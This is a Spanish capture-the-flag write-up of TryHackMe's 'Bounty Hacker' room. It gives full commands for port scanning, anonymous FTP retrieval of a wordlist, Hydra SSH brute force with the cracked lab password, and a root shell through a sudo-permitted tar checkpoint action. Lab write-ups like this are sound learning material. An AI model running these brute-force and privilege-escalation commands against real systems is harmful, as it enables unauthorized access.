@@ -1,0 +1,200 @@
+---
+title: 'Bounty Hacker'
+description: 'FTP anónimo para obtener una wordlist y un usuario, fuerza bruta SSH con Hydra y escalada a root abusando de un sudo mal configurado sobre tar (GTFOBins).'
+publishDate: 2026-09-01
+tags:
+  - cybersecurity
+  - tryhackme
+  - privesc
+---
+
+**Dificultad:** Easy **Categoría:** FTP anónimo, fuerza bruta SSH, escalada de privilegios vía GTFOBins (`tar`) **Sala:** [https://tryhackme.com/room/cowboyhacker](https://tryhackme.com/room/cowboyhacker)
+
+## Descripción de la sala
+
+> Presumiste en el bar de ser el hacker más élite del sistema solar, y unos cazarrecompensas decidieron ponerte a prueba. Demuestra tu estatus.
+
+Máquina Linux orientada a principiantes que combina acceso **FTP anónimo** para obtener credenciales indirectas, **fuerza bruta SSH** dirigida con un diccionario a medida, y una **escalada de privilegios trivial** aprovechando un permiso `sudo` mal configurado sobre el binario `tar`.
+
+> **Nota sobre placeholders:** se usa `target`/`{IP}` para representar la IP asignada por TryHackMe (cambia en cada despliegue). El resto de nombres (usuario `lin`, archivos `locks.txt`/`task.txt`) son fijos en esta máquina.
+
+---
+
+## 1. Preparación y escaneo de puertos
+
+```bash
+nmap -p- --open -T5 -v -n target -oG scans/initial-scan
+extractPorts scans/initial-scan
+```
+
+- `-p-`: escanea los 65535 puertos TCP.
+- `--open`: solo muestra puertos abiertos.
+- `-T5`: temporización muy agresiva (entorno de laboratorio con baja latencia).
+- `-v`: verboso.
+- `-n`: sin resolución DNS.
+- `-oG`: salida «grepable» para procesar con scripts.
+- `extractPorts`: extrae la lista de puertos abiertos desde el `-oG` para usarla en un segundo escaneo dirigido.
+
+**Puertos esperados:**
+
+| Puerto | Servicio           |
+| ------ | ------------------ |
+| 21/tcp | FTP (vsftpd 3.0.3) |
+| 22/tcp | SSH                |
+| 80/tcp | HTTP               |
+
+Conviene lanzar un segundo escaneo con detección de versión y scripts por defecto sobre esos puertos:
+
+```bash
+nmap -sV -sC -p21,22,80 {IP} -oN scans/detailed-scan
+```
+
+Este escaneo suele reportar explícitamente `ftp-anon: Anonymous FTP login allowed`, lo que ya adelanta el primer vector de ataque.
+
+---
+
+## 2. Enumeración FTP anónima (paso previo no incluido en los apuntes)
+
+Antes de la fuerza bruta con Hydra, es necesario **obtener el diccionario de contraseñas (`locks.txt`) y el nombre de usuario (`lin`)**, ya que ambos se usan como argumentos de Hydra en estos apuntes pero no se explica de dónde salen. Se consiguen así:
+
+```bash
+ftp {IP}
+# Usuario: anonymous
+# Contraseña: (en blanco, o cualquier valor / tu email, según el servidor)
+```
+
+Dentro de la sesión FTP:
+
+```
+ftp> ls -la
+ftp> mget *
+ftp> bye
+```
+
+- `ls -la`: lista el contenido del directorio, incluyendo archivos ocultos.
+- `mget *`: descarga todos los archivos disponibles a tu máquina local sin pedir confirmación individual (puede requerir `prompt` antes para desactivar la confirmación interactiva, según el cliente FTP).
+- `bye`: cierra la sesión.
+
+Se obtienen dos archivos:
+
+- **`locks.txt`**: una lista de posibles contraseñas (funciona como wordlist personalizada).
+- **`task.txt`**: una nota interna firmada por el usuario **`lin`**, mencionando tareas pendientes de un supuesto «sindicato» — el nombre del firmante es el usuario que usaremos para la fuerza bruta.
+
+---
+
+## 3. Ataque de fuerza bruta SSH
+
+### 3.1 Limpieza de `known_hosts` (buena práctica)
+
+```bash
+ssh-keygen -f '~/.ssh/known_hosts' -R 'target'
+```
+
+- `-R`: elimina cualquier entrada previa asociada al host `target` (o su IP) del archivo `known_hosts`.
+- Esto es necesario en máquinas de laboratorio como TryHackMe, donde la **misma IP puede reasignarse a distintas máquinas** en despliegues sucesivos; sin este paso, SSH podría rechazar la conexión mostrando una advertencia de «posible ataque man-in-the-middle» (`REMOTE HOST IDENTIFICATION HAS CHANGED!`) porque la huella (fingerprint) de la clave del host no coincide con la registrada anteriormente para esa misma IP.
+
+### 3.2 Fuerza bruta con Hydra
+
+```bash
+hydra -l lin -P locks.txt target ssh -t 4 -V
+```
+
+- `-l lin`: usuario fijo a probar (obtenido de `task.txt`).
+- `-P locks.txt`: diccionario de contraseñas (obtenido vía FTP).
+- `target`: IP/host objetivo.
+- `ssh`: servicio a atacar.
+- `-t 4`: 4 hilos concurrentes (un valor moderado; SSH suele penalizar—o incluso banear temporalmente—intentos de conexión demasiado agresivos).
+- `-V`: modo verboso, muestra cada combinación probada en tiempo real.
+
+**Credenciales obtenidas:**
+
+```
+usuario: lin
+contraseña: RedDr4gonSynd1cat3
+```
+
+### 3.3 Acceso SSH
+
+```bash
+ssh lin@{IP}
+# contraseña: RedDr4gonSynd1cat3
+```
+
+Una vez dentro, se puede capturar la flag de usuario, típicamente ubicada en:
+
+```bash
+cat /home/lin/user.txt
+```
+
+---
+
+## 4. Escalada de privilegios
+
+### 4.1 Enumeración de permisos sudo
+
+```bash
+sudo -l
+```
+
+Salida esperada:
+
+```
+User lin may run the following commands on bountyhacker:
+    (root) /bin/tar
+```
+
+Esto indica que el usuario `lin` puede ejecutar el binario **`/bin/tar` como root**, sin necesidad de contraseña adicional (o solicitándola una única vez, según configuración). `tar` no está diseñado para ejecutarse con privilegios elevados de forma segura: tiene funcionalidades legítimas (como `--checkpoint-action`) que permiten ejecutar comandos arbitrarios durante su propio proceso de archivado, lo cual lo convierte en un vector clásico de escalada de privilegios documentado en **GTFOBins** (gtfobins.github.io/gtfobins/tar/).
+
+### 4.2 Explotación
+
+```bash
+sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
+```
+
+Desglose del comando:
+
+- `-cf /dev/null /dev/null`: le dice a `tar` que **cree** (`-c`) un archivo (`-f`) enviándolo a `/dev/null` (lo descarta), usando `/dev/null` también como «archivo» de entrada a comprimir. El contenido en sí no importa; solo se usa para forzar a `tar` a ejecutarse y así activar el mecanismo de _checkpoints_.
+- `--checkpoint=1`: le indica a `tar` que ejecute una acción de «punto de control» (checkpoint) tras procesar 1 archivo — es decir, casi inmediatamente.
+- `--checkpoint-action=exec=/bin/bash`: define la acción a ejecutar en cada checkpoint: lanzar `/bin/bash`.
+
+Como el propio `tar` se ejecuta con `sudo` (privilegios de root), el `/bin/bash` que lanza internamente **hereda esos mismos privilegios**, dando como resultado una shell interactiva de root:
+
+```bash
+id
+# uid=0(root) gid=0(root) groups=0(root)
+```
+
+### 4.3 Captura de la flag de root
+
+```bash
+cd /root
+cat root.txt
+```
+
+---
+
+## 5. Resumen de la cadena de ataque
+
+1. **Reconocimiento** con `nmap` → FTP (21), SSH (22), HTTP (80); el propio nmap revela que el FTP permite login anónimo.
+2. **Acceso FTP anónimo** → se descargan `locks.txt` (wordlist) y `task.txt` (revela el usuario `lin`).
+3. **Fuerza bruta SSH** con `hydra`, usando el usuario y el wordlist obtenidos por FTP → contraseña `RedDr4gonSynd1cat3`.
+4. **Acceso SSH** como `lin` → flag de usuario.
+5. **Enumeración de privilegios** con `sudo -l` → `lin` puede ejecutar `/bin/tar` como root sin restricciones.
+6. **Explotación vía GTFOBins**: se abusa de `--checkpoint-action=exec=` de `tar` para lanzar una shell de root.
+7. **Root** y captura de la flag final.
+
+## 6. Lecciones aprendidas / conceptos clave
+
+- **FTP anónimo mal configurado** es una fuente habitual de fuga de información (credenciales, wordlists, notas internas) que facilita ataques dirigidos posteriores.
+- **Fuerza bruta dirigida** (con un wordlist específico y un usuario conocido) es mucho más eficiente que un ataque genérico con `rockyou.txt`, y en escenarios reales reduce drásticamente el ruido generado (menos intentos = menos probabilidad de detección/bloqueo).
+- **`known_hosts` y cambios de IP**: en entornos de laboratorio donde las IPs se reasignan, limpiar `known_hosts` con `ssh-keygen -R` evita fricciones al reconectar.
+- **GTFOBins** ([https://gtfobins.github.io/](https://gtfobins.github.io/)) es un recurso de referencia imprescindible: cataloga binarios «legítimos» del sistema (`tar`, `find`, `vim`, `less`, etc.) que pueden abusarse para escapar de restricciones o escalar privilegios cuando se permite su ejecución con `sudo`, SUID, o en entornos restringidos.
+- **Reglas `sudo` demasiado permisivas** sobre binarios de propósito general (`tar`, `cp`, `find`, `awk`, `vim`…) son, en la práctica, equivalentes a otorgar acceso completo de root, incluso si el binario en sí «solo» comprime archivos.
+
+## 7. Herramientas utilizadas
+
+`nmap`, cliente `ftp`, `ssh-keygen`, `hydra`, cliente `ssh`, `sudo`, `tar` (abuso vía GTFOBins).
+
+---
+
+_Writeup con fines académicos, elaborada a partir de apuntes propios de la resolución de la máquina «Bounty Hacker» en TryHackMe, complementada con writeups públicas de la comunidad para completar el paso de enumeración FTP anónima que precede a la fuerza bruta._
